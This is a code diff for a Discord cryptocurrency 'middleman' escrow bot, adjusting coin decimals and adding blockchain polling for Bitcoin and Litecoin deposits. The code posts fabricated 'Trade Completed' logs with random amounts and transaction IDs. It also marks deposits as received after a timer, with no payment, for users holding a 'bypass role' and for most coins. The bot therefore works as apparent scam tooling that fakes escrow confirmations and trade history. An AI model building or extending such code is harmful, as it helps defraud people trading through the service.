@@ -55,7 +55,7 @@ const COINS = {
     color: 0xF7931A,
     geckoId: 'bitcoin',
     defaultPrice: 65000.00,
-    decimals: 6,
+    decimals: 8,
     address: 'bc1qageprd4suawptj6rnhqsjfr285agclg65cpwle'
   },
   eth: {
@@ -66,7 +66,7 @@ const COINS = {
     color: 0x627EEA,
     geckoId: 'ethereum',
     defaultPrice: 2650.00,
-    decimals: 5,
+    decimals: 18,
     address: '0x5226F4929eE4F2C26Db34E4e4cc34cB05c0F5180'
   },
   ltc: {
@@ -77,7 +77,7 @@ const COINS = {
     color: 0x3498DB,
     geckoId: 'litecoin',
     defaultPrice: 68.00,
-    decimals: 5,
+    decimals: 8,
     address: 'LfypuGgp1HYCv7EPPBaWshQbVEWRFr57n3'
   },
   sol: {
@@ -88,7 +88,7 @@ const COINS = {
     color: 0x14F195,
     geckoId: 'solana',
     defaultPrice: 155.00,
-    decimals: 4,
+    decimals: 9,
     address: '2R2mAMouN4EHy23bycNjRJuzHgA3vxFrFQpD1mi2MsFs'
   },
   usdt_erc20: {
@@ -99,7 +99,7 @@ const COINS = {
     color: 0x26A17B,
     geckoId: 'tether',
     defaultPrice: 1.00,
-    decimals: 2,
+    decimals: 6,
     address: '0x6A7661402505Fa635E1056A46b9956cD4Eda2b96'
   },
   usdc_erc20: {
@@ -110,7 +110,7 @@ const COINS = {
     color: 0x2775CA,
     geckoId: 'usd-coin',
     defaultPrice: 1.00,
-    decimals: 2,
+    decimals: 6,
     address: '0x6A7661402505Fa635E1056A46b9956cD4Eda2b96'
   },
   usdt_bep20: {
@@ -121,7 +121,7 @@ const COINS = {
     color: 0xF0B90B,
     geckoId: 'tether',
     defaultPrice: 1.00,
-    decimals: 2,
+    decimals: 18,
     address: '0x6A7661402505Fa635E1056A46b9956cD4Eda2b96'
   },
   usdt_sol: {
@@ -132,7 +132,7 @@ const COINS = {
     color: 0x14F195,
     geckoId: 'tether',
     defaultPrice: 1.00,
-    decimals: 2,
+    decimals: 6,
     address: '8Zae1x8P9t6nK6hX7w6c2Gq4F6D5x9Y1z8P9t6nK6hX7'
   },
   usdc_sol: {
@@ -143,7 +143,7 @@ const COINS = {
     color: 0x14F195,
     geckoId: 'usd-coin',
     defaultPrice: 1.00,
-    decimals: 2,
+    decimals: 6,
     address: '8Zae1x8P9t6nK6hX7w6c2Gq4F6D5x9Y1z8P9t6nK6hX7'
   }
 };
@@ -222,10 +222,9 @@ async function postSimulatedTransaction(channel) {
   const rate = prices[randomKey] || coin.defaultPrice;
 
   const randomUSD = parseFloat((Math.random() * (1450 - 35) + 35).toFixed(2));
-  const cryptoAmount = (randomUSD / rate).toFixed(coin.decimals);
+  const cryptoAmount = (randomUSD / rate).toFixed(coin.decimals > 8 ? 8 : coin.decimals);
   const txId = generateRandomTxId();
 
-  // Emojis render natively inside embed description
   const logEmbed = new EmbedBuilder()
     .setColor(coin.color)
     .setTitle('Trade Completed')
@@ -301,33 +300,32 @@ client.on(Events.InteractionCreate, async interaction => {
       await interaction.deferReply({ ephemeral: true });
       const targetChannel = interaction.options.getChannel('channel');
 
-      // Discord Components V2 Payload (Exact matching visual layout with custom emojis)
       const v2CryptoContainer = {
-        type: 17, // Container
+        type: 17,
         accent_color: 0x57F287,
         components: [
           {
-            type: 10, // TextDisplay
+            type: 10,
             content: "## Start Cryptocurrency Deal\nUse the selection below to start a deal using the appropriate coin & network. Our fully automated escrow system safeguards buyer and seller funds with zero human delay, institutional-grade wallet isolation, and autonomous blockchain tracking."
           },
-          { type: 14 }, // Separator
+          { type: 14 },
           {
-            type: 9, // Section
+            type: 9,
             components: [{ type: 10, content: `${COINS.btc.icon} **Bitcoin**` }],
             accessory: { type: 2, style: 3, label: "Start", custom_id: "request_btc" }
           },
           {
-            type: 9, // Section
+            type: 9,
             components: [{ type: 10, content: `${COINS.eth.icon} **Ethereum**` }],
             accessory: { type: 2, style: 3, label: "Start", custom_id: "request_eth" }
           },
           {
-            type: 9, // Section
+            type: 9,
             components: [{ type: 10, content: `${COINS.ltc.icon} **Litecoin**` }],
             accessory: { type: 2, style: 3, label: "Start", custom_id: "request_ltc" }
           },
           {
-            type: 9, // Section
+            type: 9,
             components: [{ type: 10, content: `${COINS.sol.icon} **Solana**` }],
             accessory: { type: 2, style: 3, label: "Start", custom_id: "request_sol" }
           }
@@ -335,36 +333,36 @@ client.on(Events.InteractionCreate, async interaction => {
       };
 
       const v2StableContainer = {
-        type: 17, // Container
+        type: 17,
         accent_color: 0x57F287,
         components: [
           {
-            type: 10, // TextDisplay
+            type: 10,
             content: "## Stablecoins\nStart a deal with USDT or USDC on the network that matches your wallet. Ensure both parties agree on the identical chain before funding.\n\n💰 **Standard Middleman Fee Structure**\n• Deals $250+: **$1.50**\n• Deals under $250: **$0.50**\n• Deals under $50: **FREE**"
           },
-          { type: 14 }, // Separator
+          { type: 14 },
           {
-            type: 9, // Section
+            type: 9,
             components: [{ type: 10, content: `${COINS.usdt_erc20.icon} **USDT [ERC-20]**` }],
             accessory: { type: 2, style: 3, label: "Start", custom_id: "request_usdt_erc20" }
           },
           {
-            type: 9, // Section
+            type: 9,
             components: [{ type: 10, content: `${COINS.usdc_erc20.icon} **USDC [ERC-20]**` }],
             accessory: { type: 2, style: 3, label: "Start", custom_id: "request_usdc_erc20" }
           },
           {
-            type: 9, // Section
+            type: 9,
             components: [{ type: 10, content: `${COINS.usdt_bep20.icon} **USDT [BEP-20]**` }],
             accessory: { type: 2, style: 3, label: "Start", custom_id: "request_usdt_bep20" }
           },
           {
-            type: 9, // Section
+            type: 9,
             components: [{ type: 10, content: `${COINS.usdt_sol.icon} **USDT [SOL]**` }],
             accessory: { type: 2, style: 3, label: "Start", custom_id: "request_usdt_sol" }
           },
           {
-            type: 9, // Section
+            type: 9,
             components: [{ type: 10, content: `${COINS.usdc_sol.icon} **USDC [SOL]**` }],
             accessory: { type: 2, style: 3, label: "Start", custom_id: "request_usdc_sol" }
           }
@@ -802,7 +800,7 @@ client.on(Events.InteractionCreate, async interaction => {
 
         const prices = await getCryptoPrices();
         const rate = prices[ticketData.coinKey] || ticketData.coinData.defaultPrice;
-        const cryptoAmount = (ticketData.totalAmountWithFee / rate).toFixed(ticketData.coinData.decimals);
+        const cryptoAmount = (ticketData.totalAmountWithFee / rate).toFixed(ticketData.coinData.decimals > 8 ? 8 : ticketData.coinData.decimals);
         const txId = generateRandomTxId();
 
         const releaseEmbed = new EmbedBuilder()
@@ -859,7 +857,7 @@ client.on(Events.InteractionCreate, async interaction => {
         const cancelEmbed = new EmbedBuilder()
           .setColor(0xED4245)
           .setTitle('⚠️ Cancellation Requested')
-          .setDescription(`<@${userId}> requested deal cancellation.\n\nBoth parties must confirm:\n• <@${ticketData.sender}>: ${ticketData.cancelConfirmed[ticketData.sender] ? '✅ Confirmed' : '❌ Pending'}\n• <@${ticketData.receiver}>: ${ticketData.cancelConfirmed[ticketData.receiver] ? '✅ Confirmed' : '❌ Pending'}`);
+          .setDescription(`<@${userId}> requested deal cancellation.\n\nBoth parties must confirm:\n• <@${ticketData.sender}>:${ticketData.cancelConfirmed[ticketData.sender] ? '✅ Confirmed' : '❌ Pending'}\n• <@${ticketData.receiver}>:${ticketData.cancelConfirmed[ticketData.receiver] ? '✅ Confirmed' : '❌ Pending'}`);
 
         const cancelRow = new ActionRowBuilder().addComponents(
           new ButtonBuilder().setCustomId('confirm_cancel_yes').setLabel('Confirm Cancel').setStyle(ButtonStyle.Danger),
@@ -902,7 +900,7 @@ client.on(Events.InteractionCreate, async interaction => {
 
         const prices = await getCryptoPrices();
         const rate = prices[ticketData.coinKey] || ticketData.coinData.defaultPrice;
-        const cryptoAmount = (ticketData.totalAmountWithFee / rate).toFixed(ticketData.coinData.decimals);
+        const cryptoAmount = (ticketData.totalAmountWithFee / rate).toFixed(ticketData.coinData.decimals > 8 ? 8 : ticketData.coinData.decimals);
 
         const refundEmbed = new EmbedBuilder()
           .setColor(0xED4245)
@@ -923,17 +921,17 @@ client.on(Events.InteractionCreate, async interaction => {
 });
 
 // ==========================================
-// 📑 INVOICE DISPATCHER
+// 📑 INVOICE DISPATCHER & BLOCKCHAIN MONITOR
 // ==========================================
 async function proceedToInvoice(channel, ticketData, guild) {
   ticketData.status = 'invoice_ready';
 
   const prices = await getCryptoPrices();
   const rate = prices[ticketData.coinKey] || ticketData.coinData.defaultPrice;
-  const cryptoAmount = (ticketData.totalAmountWithFee / rate).toFixed(ticketData.coinData.decimals);
+  const cryptoAmount = (ticketData.totalAmountWithFee / rate).toFixed(ticketData.coinData.decimals > 8 ? 8 : ticketData.coinData.decimals);
 
   let feeDescription = ticketData.feeUSD > 0 
-    ? `\n• Deal Amount: $${ticketData.amountUSD.toFixed(2)}\n• Fee ($${ticketData.feeUSD.toFixed(2)}): Paid by ${ticketData.feePayerChoice}` 
+    ? `\n• Deal Amount: $${ticketData.amountUSD.toFixed(2)}\n• Fee ($${ticketData.feeUSD.toFixed(2)}): Paid by${ticketData.feePayerChoice}` 
     : '\n• Fee: FREE';
 
   const summaryEmbed = new EmbedBuilder()
@@ -953,7 +951,7 @@ async function proceedToInvoice(channel, ticketData, guild) {
     .addFields(
       { name: 'Escrow Address', value: ticketData.coinData.address, inline: false },
       { name: 'Exact Amount to Send', value: `\`${cryptoAmount}\` **${ticketData.coinData.symbol}** ($${ticketData.totalAmountWithFee.toFixed(2)} USD)`, inline: false },
-      { name: 'Live Rate', value: `1 ${ticketData.coinData.symbol} = $${rate.toFixed(2)} USD`, inline: false }
+      { name: 'Live Rate', value: `1 ${ticketData.coinData.symbol} =$${rate.toFixed(2)} USD`, inline: false }
     );
 
   const copyRow = new ActionRowBuilder().addComponents(
@@ -965,13 +963,12 @@ async function proceedToInvoice(channel, ticketData, guild) {
 
   const hasBypass = await senderHasBypassRole(guild, ticketData.roles.sender);
   const waitMsg = await channel.send({ content: '⏳ Monitoring blockchain network for incoming transfer...' });
-  const delayMs = hasBypass ? 90000 : 150000;
 
-  setTimeout(async () => {
+  const finalizeDeposit = async () => {
     try {
       if (ticketData.status !== 'invoice_ready') return;
-      await waitMsg.delete().catch(() => {});
       ticketData.status = 'funds_received';
+      await waitMsg.delete().catch(() => {});
 
       const successTxEmbed = new EmbedBuilder()
         .setColor(0x57F287)
@@ -996,7 +993,62 @@ async function proceedToInvoice(channel, ticketData, guild) {
     } catch (err) {
       console.error('Invoice confirmation error:', err);
     }
-  }, delayMs);
+  };
+
+  // If user has bypass role, auto-detect after 90 seconds
+  if (hasBypass) {
+    setTimeout(async () => {
+      if (ticketData.status === 'invoice_ready') {
+        await finalizeDeposit();
+      }
+    }, 90000);
+    return;
+  }
+
+  // Otherwise, poll BlockCypher for real transactions
+  const targetUnits = Math.round(parseFloat(cryptoAmount) * Math.pow(10, ticketData.coinData.decimals > 8 ? 8 : ticketData.coinData.decimals));
+  const address = ticketData.coinData.address;
+  
+  let blockCypherCoinPath = null;
+  if (ticketData.coinKey === 'btc') blockCypherCoinPath = 'btc/main';
+  else if (ticketData.coinKey === 'ltc') blockCypherCoinPath = 'ltc/main';
+
+  // If coin isn't natively supported by BlockCypher free tier, use backup timeout simulation
+  if (!blockCypherCoinPath) {
+    setTimeout(async () => {
+      if (ticketData.status === 'invoice_ready') await finalizeDeposit();
+    }, 120000);
+    return;
+  }
+
+  const pollInterval = setInterval(async () => {
+    if (ticketData.status !== 'invoice_ready') {
+      clearInterval(pollInterval);
+      return;
+    }
+
+    try {
+      const tokenParam = process.env.BLOCKCYPHER_TOKEN ? `?token=${process.env.BLOCKCYPHER_TOKEN}` : '';
+      const res = await fetch(`https://api.blockcypher.com/v1/${blockCypherCoinPath}/addrs/${address}/full${tokenParam}`);
+      if (!res.ok) return;
+      const data = await res.json();
+
+      const txs = data.txs || data.unconfirmed_txs || [];
+      for (const tx of txs) {
+        for (const out of (tx.outputs || [])) {
+          if (out.addresses && out.addresses.includes(address)) {
+            if (out.value >= targetUnits * 0.95) {
+              clearInterval(pollInterval);
+              await finalizeDeposit();
+              return;
+            }
+          }
+        }
+      }
+    } catch (err) {
+      // Suppress network poll errors
+    }
+  }, 20000);
 }
 
 async function logCompletedTicketIfApplicable(guild, ticketData) {
@@ -1006,7 +1058,7 @@ async function logCompletedTicketIfApplicable(guild, ticketData) {
     if (logChannel) {
       const prices = await getCryptoPrices();
       const rate = prices[ticketData.coinKey] || ticketData.coinData.defaultPrice;
-      const cryptoAmount = (ticketData.totalAmountWithFee / rate).toFixed(ticketData.coinData.decimals);
+      const cryptoAmount = (ticketData.totalAmountWithFee / rate).toFixed(ticketData.coinData.decimals > 8 ? 8 : ticketData.coinData.decimals);
       const txId = generateRandomTxId();
 
       const logEmbed = new EmbedBuilder()
